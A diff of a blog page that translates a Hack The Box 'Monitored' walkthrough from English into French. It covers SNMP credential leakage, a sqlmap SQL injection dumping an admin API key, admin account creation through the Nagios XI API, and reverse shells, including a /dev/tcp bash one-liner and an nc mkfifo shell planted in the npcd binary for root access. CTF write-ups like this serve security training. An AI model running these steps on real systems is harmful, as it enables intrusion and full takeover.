@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access." />
+<meta name="description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&amp;rsquo;accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l&amp;rsquo;énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d&amp;rsquo;identifiants que nous utilisons pour nous connecter." />
 <meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -37,18 +37,18 @@
 
 
 <meta itemprop="name" content="HTB: Monitored">
-<meta itemprop="description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access."><meta itemprop="datePublished" content="2024-05-09T21:41:07-05:00" />
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&rsquo;accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l&rsquo;énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d&rsquo;identifiants que nous utilisons pour nous connecter."><meta itemprop="datePublished" content="2024-05-09T21:41:07-05:00" />
 <meta itemprop="dateModified" content="2024-05-09T21:41:07-05:00" />
-<meta itemprop="wordCount" content="1474"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" />
+<meta itemprop="wordCount" content="1459"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" />
 <meta itemprop="keywords" content="Hack The Box," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" /><meta name="twitter:title" content="HTB: Monitored"/>
-<meta name="twitter:description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access."/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&rsquo;accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l&rsquo;énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d&rsquo;identifiants que nous utilisons pour nous connecter."/>
 
 
 
     <meta property="og:title" content="HTB: Monitored" />
-<meta property="og:description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage CVE-2023-40931 to add a new admin account to the Nagios XI instance to grant us access." />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&rsquo;accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l&rsquo;énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d&rsquo;identifiants que nous utilisons pour nous connecter." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/05/htb-monitored/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-05-09T21:41:07-05:00" />
@@ -202,11 +202,11 @@ if (!doNotTrack) {
 <li>OS: Linux</li>
 </ul>
 <hr>
-<p>Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage <code>CVE-2023-40931</code> to  add a new admin account to the Nagios XI instance to grant us access. By executing a command in Nagios XI we gain our initial foothold to recover the user flag, and by manipulating some services we escalate our privileges to find the root flag.</p>
-<p>Target IP - <code>10.10.11.248</code></p>
+<p>Monitored met l&rsquo;accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l&rsquo;énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d&rsquo;identifiants que nous utilisons pour nous connecter. Nous découvrons la version du logiciel sur la cible et utilisons le <code>CVE-2023-40931</code> pour ajouter un nouveau compte administrateur à l&rsquo;instance de Nagios XI afin de nous accorder l&rsquo;accès. En exécutant une commande (reverse shell) dans Nagios XI, un accès initial est établi et en manipulant certains services, nous escaladons nos privilèges pour pour accéder au compte root.</p>
+<p>Adresse IP cible - <code>10.10.11.248</code></p>
 <h2 id="scanning">Scanning</h2>
 <pre tabindex="0"><code>nmap -sC -sV -oA nmap/Monitored 10.10.11.248
-</code></pre><p><strong>Results</strong></p>
+</code></pre><p><strong>Résultats</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-17 11:55 CDT
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.248
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
@@ -234,54 +234,54 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.69 seconds
-</span></span></code></pre></div><p>Four open ports are found, 22 (SSH), 80 (HTTP with Apache), 389 (LDAP), 443 (HTTPS). We also get redirected to <code>nagios.monitored.htb/</code>.</p>
+</span></span></code></pre></div><p>Quatre ports ouverts sont détectés, 22 (SSH), 80 (HTTP avec Apache), 389 (LDAP), 443 (HTTPS). Nous sommes également redirigés vers <code>nagios.monitored.htb/</code>.</p>
 <pre tabindex="0"><code>sudo echo &#34;10.10.11.248 monitored.htb nagios.monitored.htb&#34; | sudo tee -a /etc/hosts
 </code></pre><h2 id="enumération">Enumération</h2>
-<p>Navigating to <code>https://nagios.monitored.htb/</code> we find a page leading us to a Nagios XI login page after we click on <code>Access Nagios XI</code>.</p>
+<p>Nous trouvons une page de login Nagios XI après avoir cliqué sur <code>Access Nagios XI</code> lorsque nous visitons <code>https://nagios.monitored.htb/</code></p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/Nagios-XI.png" alt="Nagios XI"></p>
-<p>The url is <code>https://nagios.monitored.htb/nagiosxi/login.php</code>. We lack the credentials to login at this moment.</p>
+<p>L&rsquo;url de cette page est <code>https://nagios.monitored.htb/nagiosxi/login.php</code>. Nous n&rsquo;avons pas les identifiants pour nous connecter pour le moment.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/Nagios-XI-login.png" alt="Nagios-login-XI"></p>
 <blockquote>
-<p>Nagios is an <strong>Open Source IT system monitoring tool</strong>. It was designed to run on the Linux operating system and can monitor devices running Linux, Windows and Unix OSes.</p>
+<p>Nagios est un <strong>outil open source de surveillance des systèmes informatiques</strong>. Il a été conçu pour fonctionner sur le système d&rsquo;exploitation Linux et peut surveiller des appareils fonctionnant sous Linux, Windows et Unix.</p>
 </blockquote>
-<p>We can do some directory enumeration with ffuf. Let&rsquo;s start with <code>https://nagios.monitored.htb/</code>.</p>
+<p>Nous pouvons faire une énumération de répertoires avec ffuf. Commençons par <code>https://nagios.monitored.htb/</code>.</p>
 <pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/fuzz.png" alt="Subdomain fuzzing"></p>
-<p>Visiting <code>https://nagios.monitored.htb/nagios</code> prompt us to log in but we don&rsquo;t have any credentials at this point.</p>
+<p>Nous trouvons un point de terminaison <code>/nagios</code> et la visite de <code>https://nagios.monitored.htb/nagios</code> nous invite à nous connecter, mais nous n&rsquo;avons pas d&rsquo;informations d&rsquo;identification à ce stade.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-login.png" alt="Second Nagios Login form"></p>
-<p>Next we fuzz <code>https://nagios.monitored.htb/nagiosxi/</code> and multiple results are found.</p>
+<p>Ensuite, nous examinons <code>https://nagios.monitored.htb/nagiosxi/</code> et plusieurs résultats sont obtenus.</p>
 <pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/FUZZ&#39; -e .php,.html,.txt -ic -fc 404 -c
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/ffuf.png" alt="Ffuf directory enumeration"></p>
 <ul>
 <li>
-<p>Most of these endpoints redirect to the login page probably because we need to be authenticated in order to access them.</p>
+<p>La plupart de ces points de terminaison redirigent vers la page de connexion, probablement parce que nous devons être authentifiés pour y accéder.</p>
 </li>
 <li>
-<p><code>/images</code> and <code>/api</code> return <code>Forbidden</code>.</p>
+<p><code>/images</code> et <code>/api</code> renvoient <code>Forbidden</code>.</p>
 </li>
 </ul>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/forbidden.png" alt="Forbidden page"></p>
 <ul>
-<li><code>/terminal</code> brings up a page titled <code>Shell In A Box</code> where we have access to a terminal in the browser to login into something.</li>
+<li><code>/terminal</code> présente une page intitulée <code>Shell In A Box</code> où nous avons accès à un terminal dans le navigateur pour nous connecter.</li>
 </ul>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/terminal.png" alt="Nagios XI terminal endpoint"></p>
-<p>Going deeper, <code>/images</code> reveals more results but we don&rsquo;t have the permissions to access them.</p>
+<p>En allant plus en profondeur, <code>/images</code> révèle davantage de résultats, mais nous n&rsquo;avons pas les permissions pour y accéder.</p>
 <pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/images/FUZZ&#39; -ic -c
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/images-fuzz.png" alt="Images endpoint enumeration"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/renewals.png" alt="Images endpoint enumeration - Renewal"></p>
-<p>Doing the same thing for <code>/api</code> we find <code>/includes</code> and <code>/v1</code>.</p>
+<p>En faisant la même chose pour <code>/api</code>, nous trouvons <code>/includes</code> et <code>/v1</code>.</p>
 <pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u &#39;https://nagios.monitored.htb/nagiosxi/api/FUZZ&#39; -ic -c
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/api.png" alt="api endpoint enumeration"></p>
-<p><code>includes</code> doesn&rsquo;t give anything useful but <code>v1</code> does returns a few interesting results.</p>
+<p><code>includes</code> ne donne rien d&rsquo;utile mais <code>v1</code> renvoie quelques résultats intéressants.</p>
 <pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u &#39;https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ&#39; -ic -fs 32 -fc 403
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/v1-fuzz.png" alt="api endpoint enumeration - v1"></p>
-<p>Both <code>license</code> and <code>autheticate</code> return errors.</p>
+<p><code>license</code> et <code>autheticate</code> renvoient tous deux des erreurs.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/license.png" alt="api endpoint enumeration - v1 - license"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/authenticate.png" alt="api endpoint enumeration - v1 - authenticate"></p>
-<p>At this point we have enumerated everything we discovered. So far we have found:</p>
+<p>À ce stade, nous avons énuméré tous les éléments découverts. Pour le moment, nous avons trouvé:</p>
 <ul>
 <li>
-<p>Three login pages:</p>
+<p>Trois pages de connexion:</p>
 <ul>
 <li><a href="https://nagios.monitored.htb/nagiosxi/" target="_blank" >https://nagios.monitored.htb/nagiosxi/</a>
 
@@ -295,126 +295,122 @@ if (!doNotTrack) {
 </ul>
 </li>
 <li>
-<p>An authentication endpoint at <a href="https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" target="_blank" >https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</a>
+<p>Un point de terminaison d&rsquo;authentification à l&rsquo;adresse <a href="https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" target="_blank" >https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</a>
 
 </p>
 </li>
 </ul>
-<p>It is clear that we need some credentials to access the target system.</p>
+<p>Il apparaît clairement que nous avons besoin d&rsquo;informations d&rsquo;identification pour accéder au système cible.</p>
 <blockquote>
-<p>Although UDP scans are rarely needed in CTFs, we should be as thorough as possible with our scanning. I scratched my head for a long time because I forgot about UDP scans.</p>
+<p>Bien que les scans UDP soient rarement nécessaires dans les CTF, nous nous devons d&rsquo;être aussi minutieux que possible dans notre reconnaissance. Je suis resté bloqué pendant longtemps après avoir omis d&rsquo;utiliser un scan UDP.</p>
 </blockquote>
-<p>Let&rsquo;s try a UDP scan.</p>
+<p>Lançons un scan UDP.</p>
 <pre tabindex="0"><code>sudo nmap -sU -sC -sV -vv 10.10.11.248
 </code></pre><blockquote>
-<p>This command will produce a lot of output and keep in mind that UDP scan are usually slower.</p>
+<p>Il est normal pour les scans UDP de prendre beaucoup de temps, ils sont généralement plus lents.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/udp-scan.png" alt="nmap UDP scan"></p>
-<p>Four ports will be discovered:</p>
+<p>Quatre ports seront découverts:</p>
 <ul>
 <li>68 - DHCP</li>
 <li>123 - NTP</li>
 <li>161 - SNMPv1</li>
 <li>162 - SNMPv3</li>
 </ul>
-<p>The most likely way to exploitation is SNMP. We can use <code>snmpwalk</code> to enumerate the service. We note that two versions of SNMP are used here, we will specify <code>SNMP V1</code> since it&rsquo;s less secure.</p>
+<p>Essayons d&rsquo;exploiter SNMP. Nous pouvons utiliser <code>snmpwalk</code> pour énumérer le service. Notons que deux versions de SNMP sont utilisées ici, nous spécifierons <code>SNMP V1</code> car elle est moins sécurisée.</p>
 <blockquote>
-<p>The command below creates a lot of output on the terminal so I sent it to a file.</p>
+<p>La commande ci-dessous génère beaucoup de données sur le terminal, il est donc préférable de l&rsquo;envoyer dans un fichier.</p>
 </blockquote>
 <pre tabindex="0"><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
-</code></pre><p>Going over the output I find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
+</code></pre><p>En examinant le contenu du fichier, nous trouvons quelques lignes faisant référence à un script <code>/opt/scripts/check_host.sh</code> avec ce qui semble être des informations d&rsquo;identification <code>svc:XjH7VCehowpR1xZB</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/creds-snmp.png" alt="SNMP potential credentials"></p>
-<p>The credentials did not work on <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> and we get the message that this user account is either disabled or non-existent at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p>
+<p>Les identifiants ne fonctionnent pas sur <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> et nous constatons que ce compte utilisateur est soit désactivé, soit inexistant sur <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-login-attempt.png" alt="NagiosXI login attempt failed"></p>
 <h2 id="accès-initial">Accès Initial</h2>
-<p>At <code>https://nagios.monitored.htb/nagios</code> we are able to login. On that page we see a PID and the software version. Trying to reuse the cookie value from this page on <code>/nagiosxi</code> also fails.</p>
+<p>Sur <code>https://nagios.monitored.htb/nagios</code>, nous pouvons nous connecter. La page affiche un PID et la version du logiciel. Essayer de réutiliser le cookie de cette page sur <code>/nagiosxi</code> échoue également.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-core.png" alt="NagiosXI login attempt successful"></p>
-<p>Searching for vulnerabilities for that specific software version we end finding <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/" target="_blank" >three CVEs</a>
+<p>En recherchant les vulnérabilités pour cette version spécifique du logiciel, nous trouvons <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/" target="_blank" >trois CVE</a>
 
-. They all allow users, with various levels of privileges, to access database fields via SQL injections.</p>
+. Ces vulnérabilités permettent à des utilisateurs disposant de différents niveaux de privilèges d&rsquo;accéder à des champs de la base de données par le biais d&rsquo;injections SQL.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-vulns.png" alt="NagiosXI vulnerabilities"></p>
-<p>We find a good explanation for the vulnerability in the post.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png" alt="CVE-2023-40931-EXPLAINED"></p>
-<p>We recall that back on the <code>/api/v1/authenticate</code> we saw the message <code>You can only use POST with authenticate.</code></p>
+<p>Rappelons que sur <code>/api/v1/authenticate</code> nous avons vu le message <code>Vous ne pouvez utiliser POST qu'avec authenticate.</code></p>
 <ol>
-<li>We send a POST request to that endpoint with the credentials of the user and receive a token</li>
+<li>Nous envoyons une requête POST à ce point de terminaison avec les informations d&rsquo;identification de l&rsquo;utilisateur et nous recevons un token</li>
 </ol>
 <pre tabindex="0"><code>curl -k -L -X POST &#34;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#34; -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34;
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/token-retrieval.png" alt="Token retrieval"></p>
 <ol start="2">
-<li>We use this token to launch an SQL injection</li>
+<li>Nous utilisons ce token pour lancer une injection SQL</li>
 </ol>
 <pre tabindex="0"><code>sqlmap -u &#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae&#34; -p id --level 5 --risk 3 --dump 
-</code></pre><p>Once you see <code>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code> enter <code>N</code>.</p>
+</code></pre><p>Lorsque le message <code>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code> apparaît entrez <code>N</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/sqlmap.png" alt="SQLmap command"></p>
-<p>SQLmap will start dumping all the tables of the database on the terminal but we can inspect the tables we are interested in by going to <code>/home/&lt;YOUR_USERNAME&gt;/.local/share/sqlmap/output/nagios.monitored.htb/dump/</code>. We know that the exploit is related to the tables <code>xi_session</code> and <code>xi_users</code>.</p>
+<p>SQLmap commencera à extraire toutes les tables de la base de données mais nous pouvons inspecter les tables qui nous intéressent en allant dans <code>/home/&lt;Votre_nom_d'utilisateur&gt;/.local/share/sqlmap/output/nagios.monitored.htb/dump/</code>. Nous savons que la vulnérabilité est liée aux tables <code>xi_session</code> et <code>xi_users</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/tables-dumped.png" alt="SQLmap tables dump"></p>
-<p>You can also scroll through the output on the terminal and find the <code>xi_users</code> table dump. We find the API key for the <code>Nagios Administrator</code> user <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>.</p>
+<p>Vous pouvez aussi défiler sur le terminal et trouver le dump de la table <code>xi_users</code>. Nous trouvons la clé API pour l&rsquo;utilisateur <code>Nagios Administrator</code> <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/API-key.png" alt="API key found"></p>
 <blockquote>
-<p>Passwords hashes are also present in the dump but we are unable to crack them.</p>
+<p>Des hashs de mots de passe sont également présents dans le dump mais nous ne sommes pas en mesure de les craquer.</p>
 </blockquote>
-<p>Still we don&rsquo;t have any valid credentials to login into Nagios XI and there is no way to sign up. Our only option is to find how to add a new account.</p>
-<p>After some research we find how to add new users via the API <a href="https://support.nagios.com/forum/viewtopic.php?t=42923" target="_blank" >here</a>
+<p>Nous n&rsquo;avons toujours pas d&rsquo;identifiants valides pour nous connecter à Nagios XI et il n&rsquo;y a aucun moyen de s&rsquo;inscrire. Notre seule option est de trouver comment ajouter un nouveau compte.</p>
+<p>Après quelques recherches, nous trouvons comment ajouter de nouveaux utilisateurs via l&rsquo;API <a href="https://support.nagios.com/forum/viewtopic.php?t=42923" target="_blank" >ici</a>
 
- and on <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502" target="_blank" >this</a>
+ et sur cette <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502" target="_blank" >page</a>
 
- page we also find that we can add an admin account by using the <code>auth_level</code> parameter.</p>
+ nous apprenons également comment ajouter un compte administrateur en utilisant le paramètre <code>auth_level</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-api.png" alt="NagiosXI add users via API"></p>
-<p>The command below is used to create a new admin user.  The <code>username</code>, <code>email</code>, <code>name</code>, and <code>password</code> fields are required.</p>
+<p>La commande ci-dessous est utilisée pour créer un nouvel utilisateur admin.  Les champs <code>username</code>, <code>email</code>, <code>name</code>, et <code>password</code> sont obligatoires.</p>
 <pre tabindex="0"><code>curl -k &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&#34; -d &#34;username=adminsec&amp;password=password123&amp;name=kscorpio&amp;email=kscorpio@monitored.htb&amp;auth_level=admin&#34;
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/user-created.png" alt="User added via API successfully"></p>
-<p>With the account newly created we are able to log into Nagios XI at <code>https://nagios.monitored.htb/nagiosxi/</code></p>
+<p>Avec le compte nouvellement créé, nous pouvons nous connecter à Nagios XI à l&rsquo;adresse <code>https://nagios.monitored.htb/nagiosxi/</code>.</p>
 <blockquote>
-<p>You will be asked to change the password once you login.</p>
+<p>Il vous sera demandé de changer le mot de passe après votre connexion.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-login.png" alt="NagiosXI login success"></p>
-<p>On the Dashboard, hover on the <code>Configure</code> menu and select <code>Core Config Manager</code>.</p>
+<p>Sur le tableau de bord, survolez le menu <code>Configure</code> et sélectionnez <code>Core Config Manager</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-config.png" alt="NagiosXI config"></p>
-<p>Select <code>Commands</code> and then <code>Add New</code>.</p>
+<p>Sélectionnez <code>Commandes</code> et ensuite <code>Add New</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/config-cmd.png" alt="Core Config Manager"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/new-cmd.png" alt="Add new command"></p>
-<p>Add a reverse shell command and save it.  For example: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP_Address&gt;/&lt;Port&gt; 0&gt;&amp;1'</code></p>
+<p>Ajoutez une commande reverse shell et sauvegardez-la.  Par exemple: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP_Address&gt;/&lt;Port&gt; 0&gt;&amp;1'</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/rev-shell-cmd.png" alt="Reverse shell command"></p>
-<p>You also have to click <code>Apply Configuration</code> for the new command to be listed. Now you should see <code>149 Commands</code>.</p>
+<p>Vous devez également cliquer sur <code>Apply Configuration</code> pour que la nouvelle commande soit listée. Vous devriez maintenant voir <code>149 Commands</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/apply-config.png" alt="Apply configuration"></p>
-<p>Let&rsquo;s start a listener on the port specified in our command.</p>
-<p>To run the command Go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
+<p>Démarrons un listener sur le port spécifié dans notre commande.</p>
+<p>Pour lancer la commande, allez dans <code>Monitoring</code> &gt; <code>Hosts</code> &gt; cliquez sur <code>localhost</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/localhost.png" alt="Configuration - localhost"></p>
-<p>Under <code>Check command</code>, select your command and click <code>Run Check Commad</code> and you will get a connection on your listener.</p>
+<p>Sous <code>Check command</code>, sélectionnez votre commande et cliquez sur <code>Run Check Command</code> et vous obtiendrez une connexion sur votre listener.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-shell.png" alt="Initial Foothold"></p>
-<p>You can get the user flag at <code>/home/nagios/user.txt</code>.</p>
+<p>Le premier flag est accessible à <code>/home/nagios/user.txt</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/user-flag.png" alt="User flag"></p>
 <h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
-<p>Running <code>sudo -l</code> we discover that the user can manipulate two services <code>nagios</code> and <code>npcd</code> in addition to running various scripts.</p>
+<p>En exécutant <code>sudo -l</code> nous découvrons que l&rsquo;utilisateur peut manipuler deux services <code>nagios</code> et <code>npcd</code> en plus de pouvoir exécuter divers scripts.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/sudo-l.png" alt="sudo -l command"></p>
-<blockquote>
-<p>The npcd service in Nagios is a <strong>daemon</strong> responsible for processing <strong>performance data</strong> received from Nagios checks.</p>
-</blockquote>
-<p>Using the <code>find</code> command we get the exact locations of <code>nagios</code> and <code>npcd</code>.</p>
+<p>En utilisant la commande <code>find</code>, nous obtenons les emplacements exacts de <code>nagios</code> et de <code>npcd</code>.</p>
 <pre tabindex="0"><code>find / -name nagios 2&gt; /dev/null
 
 find / -name npcd 2&gt; /dev/null
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Monitored/services-location.png" alt="services locations"></p>
-<p>We also check the permissions of the binaries and we notice that we have write permission for  <code>npcd</code>. We can edit the file content and replace it with a malicious command to get a shell.</p>
+<p>Nous vérifions également les permissions des binaires et nous notons que nous avons les permissions d&rsquo;écriture pour <code>npcd</code>. Nous pouvons éditer le contenu du fichier et le remplacer par une commande malveillante pour obtenir un shell.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/binaries-perms.png" alt="Binaries permissions"></p>
 <ol>
-<li>Stop the service</li>
+<li>Stopper le service</li>
 </ol>
 <pre tabindex="0"><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
 </code></pre><ol start="2">
-<li>Edit <code>npcd</code></li>
+<li>Editer <code>npcd</code></li>
 </ol>
 <pre tabindex="0"><code>echo &#39;#!/bin/bash&#39; &gt; /usr/local/nagios/bin/npcd
 
 echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 5555 &gt;/tmp/f&#39; &gt;&gt; /usr/local/nagios/bin/npcd
 </code></pre><ol start="3">
-<li>Start a listener and start the <code>npcd</code> service using the script.</li>
+<li>Démarrez un listener et démarrez le service <code>npcd</code> à l&rsquo;aide du script</li>
 </ol>
 <pre tabindex="0"><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
-</code></pre><p>We get a root shell on our listener and we can read the root flag at <code>/root/root.txt</code>.</p>
+</code></pre><p>Nous obtenons un shell root sur notre listener et nous pouvons lire le drapeau root dans <code>/root/root.txt</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/root-flag.png" alt="Root flag"></p>
